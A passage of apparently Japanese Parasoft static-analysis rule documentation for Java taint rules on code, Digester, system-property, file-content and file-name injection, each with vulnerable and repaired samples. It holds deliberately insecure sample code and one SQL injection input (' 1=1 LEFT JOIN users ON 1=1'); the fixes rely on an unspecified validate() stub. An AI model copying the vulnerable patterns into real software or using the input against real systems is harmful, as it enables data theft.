javax.el.ExpressionFactory
   * createValueExpression(...)

javax.script.ScriptEngine
   * eval(...)
   
ognl.Ognl
   * getValue(...)
   * parseExpression(...)
      
com.opensymphony.xwork2.ognl.OgnlUtil
   *getValue(...)
   
org.springframework.expression.ExpressionParser
   *parseExpression(...)
   


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>

v10.4.3



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

「ソフトウェアがユーザーの入力にコード構文を許可している場合、攻撃者が
コードを細工し、ソフトウェアの意図された制御フローを変えることができる
場合があります。このような変更は、恣意的なコードの実行につながる可能性が
あります。」[CWE-94]

「コード インジェクション攻撃は、ほとんどすべてのケースでデータの完全性の毀損に
つながります。なぜなら、制御面で挿入されたデータは、常にデータの読み取りまたは
書き込みに付随するからです。さらに、コード インジェクションは多くの場合、恣意的な
コードの実行につながります。」[CWE-95] 



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
このルールをパラメータライズして、以下のソースのデータを汚染されていると見なすことができます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>

入力ベースの攻撃を防ぐのに役立ちます (「セキュリティとの関連」を参照)。



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

次のサンプルでは、汚染されている可能性があるデータを検証せずに
parseExpression メソッドに渡しています。

import javax.servlet.http.HttpServletRequest;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class Example
{
    public void example(HttpServletRequest request)
    {
        String string = request.getParameter("code");
        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(string); // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

データを検証してから使用します。

import java.io.IOException;

import javax.servlet.http.HttpServletRequest;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public abstract class Repair
{
    public void example(HttpServletRequest request)
        throws IOException
    {
        String string = request.getParameter("code");
        ExpressionParser parser = new SpelExpressionParser();
        String validExpression = validate(string);
        Expression exp = parser.parseExpression(validExpression); // 違反ではない
    }

    abstract String validate(String str);
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-94: Improper Control of Generation of Code ('Code Injection')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/94.html">https://cwe.mitre.org/data/definitions/94.html</A>

CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/95.html">https://cwe.mitre.org/data/definitions/95.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDDIG" href="#top">[Top]</a><br/><br/><STRONG>
Jakarta Digester インジェクションから防御する [BD.SECURITY.TDDIG]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
エンド ユーザーからのデータを、検証せずにそのまま
Jakarta Digester のクエリーまたは評価で使用している場合、
このルールは違反をレポートします。
検証せずにユーザー データを使用すると、機密データが不正に公開されたり
危険なメソッドが実行されたりする恐れがあります。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。

   org.apache.commons.digester.Rules
      * add(String, Rule)
      * match(String, String)
      * setNamespaceURI(String)
   
   org.apache.commons.digester.Rule
      * setNamespaceURI(String)

   org.apache.commons.digester.RegexMatcher
      * match(String, String)

   org.apache.commons.digester.Substitutor
      * substitute(String)

   org.apache.commons.digester.SimpleRegexMatcher
      * match(String, String)

   org.apache.commons.digester.Digester
      * addBeanPropertySetter(String)
      * findNamespaceURI(String)
      * getFeature(String)
      * getProperty(String)
      * parse(String)
      * peek(String)
      * pop(String)
      * push(String)
      * pushParams(String)
      * register(String, String)
      * resolveEntity(String, String)
      * setProperty(String, Object)
      * setPublicId(String)
      * setRuleNamespaceURI(String)
      * setSchema(String)
      * setSchemaLanguage(String)

   ルール コンストラクター
      * org.apache.commons.digester.BeanPropertySetterRule
      * org.apache.commons.digester.CallMethodRule
      * org.apache.commons.digester.CallParamRule
      * org.apache.commons.digester.FactoryCreateRule
      * org.apache.commons.digester.ObjectCreateRule
      * org.apache.commons.digester.ObjectParamRule
      * org.apache.commons.digester.PathCallParamRule
      * org.apache.commons.digester.SetNestedPropertiesRule
      * org.apache.commons.digester.SetNextRule
      * org.apache.commons.digester.SetPropertiesRule
      * org.apache.commons.digester.SetPropertyRule
      * org.apache.commons.digester.SetRootRule
      * org.apache.commons.digester.SetTopRule



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

1. OWASP の 2017 年 アプリケーション脆弱性トップ 10 の #1 「A1 - インジェクション」を推進します。

Digester コンポーネントは、XML コンフィギュレーション ファイルを読み込んで
システム内でさまざまな Java オブジェクトを初期化するための
一般的な実装を提供します。 
基本的に、Digester のパッケージを利用すると、XML -&amp;gt; Java オブジェクトの
マッピング モジュールを構成できます。これは、ネストされた XML 要素の
特定パターンが認識されるたびに、ルールと呼ばれる特定のアクションをトリガーします。
さまざまな定義済みルールが用意されており、ユーザが独自のルールを
作成することもできます。

ここでのルール コンストラクター、マッチャー、およびプロパティ設定メソッドは、
汚染されたデータに非常に敏感です。なぜなら、実際のオブジェクト作成や
システム プロパティの変更の恐れがあるからです。
チェックされたデータだけが Digester コンポーネントに達するべきです。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。
[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
「セキュリティとの関連」セクションを参照してください。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
Digester のインスタンスには、操作をカスタマイズするために使用できる
コンフィギュレーション プロパティがあります。
コンフィギュレーション プロパティは、parse() のバリアントを呼び出す前に
設定しなければなりません。

scalar プロパティに加えて、DOCTYPE 宣言で参照される DTD (Document Type Definition) の
ローカル コピーも登録できます。DTD に従って、
XML パーサーは指定の public 識別子を持つ DOCTYPE 宣言を発見するたびに、
DOCTYPE 宣言中の識別子ではなく、登録されたシステム識別子 (URL) での
実際の DTD の内容を利用します。

次のサンプル コードでは、ユーザー データが Digester DTD 登録に達するため、 
不正に XML 文書がパースされる恐れがあります。

import java.net.URL;
import javax.servlet.http.HttpServletRequest;
import org.apache.commons.digester.Digester;

public abstract class Example
{
    public abstract String getLocationForOperation(String operation);

    public void example(Digester digester, HttpServletRequest httpRequest)
        throws Exception
    {
        String sOperation = httpRequest.getParameter("requested_operation");
        String sLocation = getLocationForOperation(sOperation);
        URL url = new URL(sLocation);
        digester.register("-//Config 1.0//EN", url.toString()); // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
使用前にデータを検証します。

import java.net.URL;
import javax.servlet.http.HttpServletRequest;
import org.apache.commons.digester.Digester;

public abstract class Repair
{
    public abstract String getLocationForOperation(String operation);

    public void example(Digester digester, HttpServletRequest httpRequest)
        throws Exception
    {
        String sOperation = validate(httpRequest.getParameter("requested_operation"));
        String sLocation = getLocationForOperation(sOperation);
        URL url = new URL(sLocation);
        digester.register("-//Config 1.0//EN", url.toString()); // 違反ではない
    }

    public abstract String validate(Object obj);
}

教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/c7e28f1c-a7ac-42e5-bc96-444e10e30982">https://app.hackedu.com/link/c7e28f1c-a7ac-42e5-bc96-444e10e30982</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A1-Injection):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">https://www.owasp.org/index.php/Top_10-2017_A1-Injection</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.1 Injection flaws
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</A>

CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/80.html">https://cwe.mitre.org/data/definitions/80.html</A>

OWASP Code Review Guide 2008 V1.1
Reviewing by technical control: Input Validation p. 81

Tags: OWASP, PCI-DSS, CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDENV" href="#top">[Top]</a><br/><br/><STRONG>
環境に対するインジェクションから防御する [BD.SECURITY.TDENV]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
エンド ユーザーから渡されたデータをチェックせずに、
そのままシステム プロパティを定義するために使用している場合、
このルールは違反をレポートします。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。

java.lang.System
   * String setProperty(String, String)
   * void setProperties(Properties)



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

未検証のデータがシステム プロパティに達すると、
攻撃者がシステムに被害を与えることが可能になる恐れがあります。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
一般的に、直接ユーザー データを使って環境プロパティを設定するケースはまず
ないでしょう。しかし、ユーザー入力に基づいてプロパティに設定する値を決定するのは
よくあるケースです。ときには、どのプロパティ値を変更するのかをユーザー入力
によって決定することさえあります。

import javax.servlet.http.HttpServletRequest;

public abstract class Example
{
    public abstract String getParameterName(String data);

    public abstract String getParameterValue(String data);

    public void example(HttpServletRequest req)
        throws Exception
    {
        String sUserData = req.getParameter("user_data");
        String sDataType = req.getParameter("user_type");
        String sParamName = getParameterName(sDataType);
        String sParamData = getParameterValue(sUserData);
        System.setProperty(sParamName, sParamData); // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
データを使用する前に検証します。

import javax.servlet.http.HttpServletRequest;

public abstract class Repair
{
    public abstract String getParameterName(String data);

    public abstract String getParameterValue(String data);

    public void example(HttpServletRequest req)
        throws Exception
    {
        String sUserData = validate(req.getParameter("user_data"));
        String sDataType = validate(req.getParameter("user_type"));
        String sParamName = getParameterName(sDataType);
        String sParamData = getParameterValue(sUserData);
        System.setProperty(sParamName, sParamData); // 違反ではない
    }

    public abstract String validate(Object obj);
}

教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/8a0ca55d-86c1-4893-a39b-de9c1cf15f55">https://app.hackedu.com/link/8a0ca55d-86c1-4893-a39b-de9c1cf15f55</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A1-Injection):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">https://www.owasp.org/index.php/Top_10-2017_A1-Injection</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.1 Injection flaws
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

OWASP Code Review Guide 2008 V1.1
Reviewing by technical control: Input Validation p. 81

Tags: OWASP, PCI-DSS

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDFILES" href="#top">[Top]</a><br/><br/><STRONG>
ファイルに対するインジェクションから防御する [BD.SECURITY.TDFILES]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
エンド ユーザーからのデータをチェックせずに、
そのままファイルに挿入している場合、
このルールは違反をレポートします。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。

   * FileOutputStream.write(...)
   * FileWriter.write(...)
   * File.write(...)



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

ファイルに書き込まれるデータは、 SQL、XML、XPath などの
何らかのリクエストを作成するために使用できます。
悪意のあるプログラマは、不正なデータをファイルの内容として
アプリケーションに渡し、危険なリクエストを実行して
個人データや機密データにアクセスできます。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
「セキュリティとの関連」セクションを参照してください。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
このサンプル アプリケーションは、サーバー上のファイルにセキュリティ固有の
データを格納し、ファイルの内容を使って SQL クエリーをコンパイルするものとします。
悪意のあるプログラマは、
信頼されない未検証のデータをファイルに渡して、SQL インジェクションを
引き起こすことができます。

次のコードは 2 つのメソッドを使用します。1 つはファイルにデータを格納するメソッドであり、
もう 1 つはファイルの内容を読み取って SQL クエリーを作成するメソッドです。

import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import javax.servlet.http.HttpServletRequest;

public class Example
{
    public void save(HttpServletRequest req)
        throws IOException
    {
        String sData = req.getParameter("user_params");
        FileOutputStream fOut = new FileOutputStream("user_data");
        fOut.write(sData.getBytes()); // 違反
        fOut.close();
    }

    public void read()
        throws IOException
    {
        BufferedReader reader = new BufferedReader(new FileReader("user_data"));
        String sRequestParams = reader.readLine();
        String sQuery = "SELECT * FROM table1 WHERE " + sRequestParams;
        // execute this SQL query and show user received data
    }
}

悪意のあるプログラマは、
リクエスト パラメーターとして " 1=1 LEFT JOIN users ON 1=1" を渡して
個人データに不正にアクセスできます。


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
使用前にデータを検証します。

import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import javax.servlet.http.HttpServletRequest;

public abstract class Repair
{
    public void save(HttpServletRequest req)
        throws IOException
    {
        String sData = validate(req.getParameter("user_params"));
        FileOutputStream fOut = new FileOutputStream("user_data");
        fOut.write(sData.getBytes()); // 違反ではない
        fOut.close();
    }

    public void read()
        throws IOException
    {
        BufferedReader reader = new BufferedReader(new FileReader("user_data"));
        String sRequestParams = reader.readLine();
        String sQuery = "SELECT * FROM table1 WHERE " + sRequestParams;
        // execute this SQL query and show user received data
    }

    public abstract String validate(Object obj);
}

教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

CWE-829: Inclusion of Functionality from Untrusted Control Sphere
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/829.html">https://cwe.mitre.org/data/definitions/829.html</A>

OWASP Code Review Guide 2008 V1.1
Reviewing by technical control: Input Validation p. 81

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDFNAMES" href="#top">[Top]</a><br/><br/><STRONG>
ファイル名に対するインジェクションから防御する [BD.SECURITY.TDFNAMES]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
エンド ユーザーからのデータを使ってファイル名を生成し、
アクセスしている場合、このルールは違反をレポートします。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。

   * File.File(...)
   * FileInputStream.FileInputStream(...)
   * FileOutputStream.FileOutputStream(...)
   * FileReader.FileReader(...)
   * FileWriter.FileWriter(...)
   * Paths.get(...)
   * FileSystem.getPath(...)
   * Formatter.Formatter(...)
   * ZipFile.ZipFile(...)
   * JarFile.JarFile(...)
   * javax.activation.FileDataSource.FileDataSource(...)
   * javax.xml.parsers.DocumentBuilder.parse(...)
   * javax.servlet.ServletContext.getRequestDispatcher(...)
   * javax.servlet.ServletContext.getResource*(...)
   * org.jaxen.Navigator.getDocument(...)


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

未検証のデータがファイル名に使用される場合、
悪意のあるプログラマが不正データを使って
システム上のファイルにアクセスできます。

このルールを推進すると、以下の脆弱性を防ぐのに役立ちます。

 - OWASP の 2017 年 アプリケーション脆弱性トップ 10「A5 - アクセス制御の不備」
 
 - CWE 2010 Top 25 リストに含まれるパス トラバーサル脆弱性
   (CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'))  



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

